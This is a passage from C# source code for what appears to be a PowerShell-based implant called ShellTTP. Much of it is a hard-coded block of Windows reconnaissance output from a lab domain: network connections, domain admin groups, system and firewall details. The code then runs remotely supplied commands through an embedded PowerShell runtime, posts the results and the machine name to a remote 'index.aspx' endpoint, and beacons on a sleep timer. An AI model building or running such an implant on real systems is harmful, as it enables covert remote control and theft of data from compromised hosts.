  TCP    192.168.202.129:55726  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55727  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55728  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55729  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55730  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55731  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55732  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55733  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55734  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55735  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55736  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55737  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55738  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55739  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55740  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55741  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55742  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55743  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55744  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55745  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55746  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55747  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55748  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55749  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55750  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55751  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55752  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55753  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55754  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55755  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55756  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55757  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55758  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55759  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55760  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55761  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55762  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55763  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55764  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55765  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55766  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55767  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55768  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55769  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55770  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55771  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55772  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55773  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55774  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55775  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55776  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55777  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55778  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55779  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55780  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55781  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55782  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:56044  23.177.2.151:443       ESTABLISHED     6108
  TCP    192.168.202.129:56045  23.177.2.151:443       ESTABLISHED     6108
  TCP    [::]:22                [::]:0                 LISTENING       2320
  TCP    [::]:135               [::]:0                 LISTENING       848
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5357              [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       524
  TCP    [::]:49153             [::]:0                 LISTENING       900
  TCP    [::]:49154             [::]:0                 LISTENING       336
  TCP    [::]:49155             [::]:0                 LISTENING       624
  TCP    [::]:49156             [::]:0                 LISTENING       640
  UDP    0.0.0.0:500            *:*                                    336
  UDP    0.0.0.0:3702           *:*                                    1644
  UDP    0.0.0.0:3702           *:*                                    1644
  UDP    0.0.0.0:4500           *:*                                    336
  UDP    0.0.0.0:5355           *:*                                    1100
  UDP    0.0.0.0:6646           *:*                                    1852
  UDP    0.0.0.0:60377          *:*                                    1644
  UDP    127.0.0.1:1900         *:*                                    1644
  UDP    127.0.0.1:58580        *:*                                    1644
  UDP    169.254.28.57:137      *:*                                    4
  UDP    169.254.28.57:138      *:*                                    4
  UDP    169.254.28.57:1900     *:*                                    1644
  UDP    169.254.28.57:58578    *:*                                    1644
  UDP    192.168.202.129:137    *:*                                    4
  UDP    192.168.202.129:138    *:*                                    4
  UDP    192.168.202.129:1900   *:*                                    1644
  UDP    192.168.202.129:58579  *:*                                    1644
  UDP    [::]:500               *:*                                    336
  UDP    [::]:3702              *:*                                    1644
  UDP    [::]:3702              *:*                                    1644
  UDP    [::]:4500              *:*                                    336
  UDP    [::]:5355              *:*                                    1100
  UDP    [::]:60378             *:*                                    1644
  UDP    [::1]:1900             *:*                                    1644
  UDP    [::1]:58577            *:*                                    1644
  UDP    [fe80::b4f8:697a:e1fb:614d%14]:1900  *:*                                    1644
  UDP    [fe80::b4f8:697a:e1fb:614d%14]:58576  *:*                                    1644
  UDP    [fe80::f89d:7f00:b64d:1c39%15]:1900  *:*                                    1644
  UDP    [fe80::f89d:7f00:b64d:1c39%15]:58575  *:*                                    1644


New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK           Z:        \\172.0.0.13\files       Microsoft Windows Network
The command completed successfully.




TheDomain

-------------------------------------------------------------------------------
THEDOMAIN
The command completed successfully.


domain

   The request will be processed at a domain controller for domain testlab.local.

   Group name     Domain Admins
   Comment        Designated administrators of the domain

   Members

   -------------------------------------------------------------------------------
   Administrator
   The command completed successfully.

controllers' /domain

   The request will be processed at a domain controller for domain testlab.local.

   Group name     Domain Controllers
   Comment        All domain controllers in the domain

   Members

   -------------------------------------------------------------------------------
   DC1$
   The command completed successfully.

servers' /domain

   The request will be processed at a domain controller for domain testlab.local.

   The group name could not be found.

   More help is available by typing NET HELPMSG 2220.

servers' /domain

   The request will be processed at a domain controller for domain testlab.local.

   The group name could not be found.

   More help is available by typing NET HELPMSG 2220.



Host Name:                 IEWIN7
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:
Registered Organization:   Microsoft
Product ID:                00392-972-8000024-85432
Original Install Date:     3/6/2018, 7:59:43 PM
System Boot Time:          4/10/2019, 7:04:39 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2793 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/19/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,991 MB
Virtual Memory: Max Size:  8,189 MB
Virtual Memory: Available: 6,916 MB
Virtual Memory: In Use:    1,273 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\IEWIN7
Hotfix(s):                 218 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB971033
                           [08]: KB2479943
                           [09]: KB2491683
                           [10]: KB2506014
                           [11]: KB2506212
                           [12]: KB2506928
                           [13]: KB2509553
                           [14]: KB2532531
                           [15]: KB2533552
                           [16]: KB2533623
                           [17]: KB2534366
                           [18]: KB2545698
                           [19]: KB2547666
                           [20]: KB2552343
                           [21]: KB2560656
                           [22]: KB2562937
                           [23]: KB2563227
                           [24]: KB2564958
                           [25]: KB2574819
                           [26]: KB2579686
                           [27]: KB2585542
                           [28]: KB2603229
                           [29]: KB2604115
                           [30]: KB2620704
                           [31]: KB2621440
                           [32]: KB2631813
                           [33]: KB2639308
                           [34]: KB2640148
                           [35]: KB2653956
                           [36]: KB2654428
                           [37]: KB2656356
                           [38]: KB2660075
                           [39]: KB2667402
                           [40]: KB2685811
                           [41]: KB2685813
                           [42]: KB2685939
                           [43]: KB2690533
                           [44]: KB2698365
                           [45]: KB2705219
                           [46]: KB2706045
                           [47]: KB2719857
                           [48]: KB2726535
                           [49]: KB2727528
                           [50]: KB2729094
                           [51]: KB2729452
                           [52]: KB2731771
                           [53]: KB2732059
                           [54]: KB2732487
                           [55]: KB2736422
                           [56]: KB2742599
                           [57]: KB2750841
                           [58]: KB2758857
                           [59]: KB2761217
                           [60]: KB2763523
                           [61]: KB2770660
                           [62]: KB2773072
                           [63]: KB2786081
                           [64]: KB2789645
                           [65]: KB2791765
                           [66]: KB2799926
                           [67]: KB2800095
                           [68]: KB2807986
                           [69]: KB2808679
                           [70]: KB2813430
                           [71]: KB2834140
                           [72]: KB2836942
                           [73]: KB2836943
                           [74]: KB2840631
                           [75]: KB2843630
                           [76]: KB2847927
                           [77]: KB2852386
                           [78]: KB2853952
                           [79]: KB2857650
                           [80]: KB2861698
                           [81]: KB2862152
                           [82]: KB2862330
                           [83]: KB2862335
                           [84]: KB2864202
                           [85]: KB2868038
                           [86]: KB2871997
                           [87]: KB2882822
                           [88]: KB2884256
                           [89]: KB2888049
                           [90]: KB2891804
                           [91]: KB2892074
                           [92]: KB2893294
                           [93]: KB2893519
                           [94]: KB2894844
                           [95]: KB2900986
                           [96]: KB2908783
                           [97]: KB2911501
                           [98]: KB2912390
                           [99]: KB2918077
                           [100]: KB2919469
                           [101]: KB2923545
                           [102]: KB2931356
                           [103]: KB2937610
                           [104]: KB2943357
                           [105]: KB2952664
                           [106]: KB2966583
                           [107]: KB2968294
                           [108]: KB2970228
                           [109]: KB2972100
                           [110]: KB2972211
                           [111]: KB2973112
                           [112]: KB2973201
                           [113]: KB2973351
                           [114]: KB2977292
                           [115]: KB2978120
                           [116]: KB2978742
                           [117]: KB2984972
                           [118]: KB2984976
                           [119]: KB2985461
                           [120]: KB2991963
                           [121]: KB2992611
                           [122]: KB3003743
                           [123]: KB3004361
                           [124]: KB3004375
                           [125]: KB3004469
                           [126]: KB3006121
                           [127]: KB3006137
                           [128]: KB3010788
                           [129]: KB3011780
                           [130]: KB3013531
                           [131]: KB3019978
                           [132]: KB3020370
                           [133]: KB3020388
                           [134]: KB3021674
                           [135]: KB3021917
                           [136]: KB3022777
                           [137]: KB3023215
                           [138]: KB3030377
                           [139]: KB3031432
                           [140]: KB3035126
                           [141]: KB3035132
                           [142]: KB3037574
                           [143]: KB3042058
                           [144]: KB3045685
                           [145]: KB3046017
                           [146]: KB3046269
                           [147]: KB3046480
                           [148]: KB3054476
                           [149]: KB3055642
                           [150]: KB3059317
                           [151]: KB3060716
                           [152]: KB3067903
                           [153]: KB3068708
                           [154]: KB3071756
                           [155]: KB3072305
                           [156]: KB3074543
                           [157]: KB3075220
                           [158]: KB3075226
                           [159]: KB3076895
                           [160]: KB3078601
                           [161]: KB3078667
                           [162]: KB3080079
                           [163]: KB3080149
                           [164]: KB3084135
                           [165]: KB3086255
                           [166]: KB3092601
                           [167]: KB3092627
                           [168]: KB3093513
                           [169]: KB3097989
                           [170]: KB3101722
                           [171]: KB3102429
                           [172]: KB3107998
                           [173]: KB3108371
                           [174]: KB3108381
                           [175]: KB3108664
                           [176]: KB3109103
                           [177]: KB3109560
                           [178]: KB3110329
                           [179]: KB3115858
                           [180]: KB3122648
                           [181]: KB3124275
                           [182]: KB3126587
                           [183]: KB3127220
                           [184]: KB3133977
                           [185]: KB3137061
                           [186]: KB3138378
                           [187]: KB3138612
                           [188]: KB3138910
                           [189]: KB3139398
                           [190]: KB3139914
                           [191]: KB3140245
                           [192]: KB3147071
                           [193]: KB3150220
                           [194]: KB3150513
                           [195]: KB3155178
                           [196]: KB3156016
                           [197]: KB3156019
                           [198]: KB3159398
                           [199]: KB3161102
                           [200]: KB3161949
                           [201]: KB3161958
                           [202]: KB3170735
                           [203]: KB3172605
                           [204]: KB3177467
                           [205]: KB3179573
                           [206]: KB3181988
                           [207]: KB3184143
                           [208]: KB4019990
                           [209]: KB4040980
                           [210]: KB4474419
                           [211]: KB4483187
                           [212]: KB4483458
                           [213]: KB4490628
                           [214]: KB958488
                           [215]: KB976902
                           [216]: KB976932
                           [217]: KB982018
                           [218]: KB4489878
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.202.254
                                 IP address(es)
                                 [01]: 192.168.202.129
                                 [02]: fe80::b4f8:697a:e1fb:614d
                           [02]: Microsoft Loopback Adapter
                                 Connection Name: Npcap Loopback Adapter
                                 DHCP Enabled:    Yes
                                 DHCP Server:     255.255.255.255
                                 IP address(es)
                                 [01]: 169.254.28.57
                                 [02]: fe80::f89d:7f00:b64d:1c39



Interface: 192.168.202.129 --- 0xe
  Internet Address      Physical Address      Type
  192.168.202.2         00-50-56-e7-c9-da     dynamic
  192.168.202.254       00-50-56-e4-d8-9f     dynamic
  192.168.202.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 169.254.28.57 --- 0xf
  Internet Address      Physical Address      Type
  169.254.255.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static



Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
22     TCP       Any      (null)
2222   TCP       Any      (null)

IMPORTANT: Command executed successfully.
However, ""netsh firewall"" is deprecated;
use ""netsh advfirewall firewall"" instead.
For more information on using ""netsh advfirewall firewall"" commands
instead of ""netsh firewall"", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .





Domain profile configuration:
                            -------------------------------------------------------------------
                            Operational mode = Enable
Exception mode = Enable
Multicast / broadcast response mode = Enable
Notification mode = Enable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
------------------------------------------------------------------ -

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
------------------------------------------------------------------ -
22     TCP       Enable  Inbound               ssh
2222   TCP       Enable  Inbound               OpenSSH

ICMP configuration for Domain profile:
Mode     Type  Description
------------------------------------------------------------------ -
Enable   2     Allow outbound packet too big

Standard profile configuration(current):
-------------------------------------------------------------------
Operational mode = Enable
Exception mode = Enable
Multicast / broadcast response mode = Enable
Notification mode = Enable

Service configuration for Standard profile:
Mode     Customized  Name
------------------------------------------------------------------ -
Enable   No          Network Discovery

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
------------------------------------------------------------------ -

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
------------------------------------------------------------------ -
22     TCP       Enable  Inbound               ssh
2222   TCP       Enable  Inbound               OpenSSH

ICMP configuration for Standard profile:
Mode     Type  Description
------------------------------------------------------------------ -
Enable   2     Allow outbound packet too big

Log configuration:
-------------------------------------------------------------------
File location = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size = 4096 KB
Dropped packets = Disable
Connections = Disable

IMPORTANT: Command executed successfully.
However, ""netsh firewall"" is deprecated;
                            use ""netsh advfirewall firewall"" instead.
For more information on using ""netsh advfirewall firewall"" commands
instead of ""netsh firewall"", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
                            ";
                        }
                        else
                        {
                            // results = ExecuteCommand(command, PowerShellInstance);
                            ExecuteCommand(command, PowerShellInstance);
                        }

                        sendResults(results, uri, parsedArgs["USERAGENT"], client);
                    }

                    System.Threading.Thread.Sleep(sleep * 1000);
                }

            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("ShellTTP.Main - Unknown - {0}", ex.ToString());
            }
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("EmbedAssembly.System.Management.Automation.dll"))
            {
                byte[] assemblyData = new byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        }

        static void checkIn(string uri, string ua, WebClient client)
        {
            sendResults("checkin:" + Environment.MachineName, uri, ua, client);
        }

        static void sendResults(string results, string uri, string ua, WebClient client)
        {
            client.Headers.Add("User-Agent", ua);
            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            client.Headers.Add("Accept", "text/plain");
            client.UploadString(uri + "index.aspx", "POST", results);
        }

        static string recurseEnumerable(object obj)
        {
            string result = string.Empty;
            IEnumerable enumerable = obj as IEnumerable;

            if (enumerable != null && !(obj is string))
            {
                foreach (var item in enumerable)
                {
                    result += recurseEnumerable(item);
                }
            }
            else
            {
                if (obj is DictionaryEntry)
                {
                    DictionaryEntry de = (DictionaryEntry)obj;
                    result += string.Format("{0} - {1}\n", de.Key, de.Value);
                }
                else
                {
                    result = string.Format("{0}\n", obj.ToString());
                }
            }

            return result;
        }
        static string ExecuteCommand(string command, PowerShell PowerShellInstance)
        {
            string result = string.Empty;

            PowerShellInstance.AddScript(command);
            Collection<PSObject> PSOutput = PowerShellInstance.Invoke();

            foreach (var obj in PSOutput)
            {
                result += recurseEnumerable(obj.BaseObject);
            }

            return result;
        }

        /// <summary>
        /// Parses options and values.
        /// </summary>
        /// <param name="args">String of flags/parameters for powerview command.</param>
        /// <returns>Dictionary containing the options and values to be used in
        /// the powerview function.</returns>
        private static Dictionary<string, string> ParseCommandArguments(string args)
        {
            Dictionary<string, string> result = new Dictionary<string, string>();

            foreach (string option in Regex.Split(args, @"\ \-"))
            {
                if (option.Trim().Length > 0)
                {
                    List<string> parameters = option.Trim().Split(' ').ToList<string>();
                    try
                    {
                        result.Add(parameters[0].ToUpper(), string.Join(" ", parameters.GetRange(1, parameters.Count - 1).ToArray()).Trim());
                    }
                    catch
                    {
                        throw new Exception("Program.ParseCommandArguments - Unable to add Argument: " + option + "\nNote: Each argument can only be set once");
                    }
                }
            }
            return result;
        }

    }
}
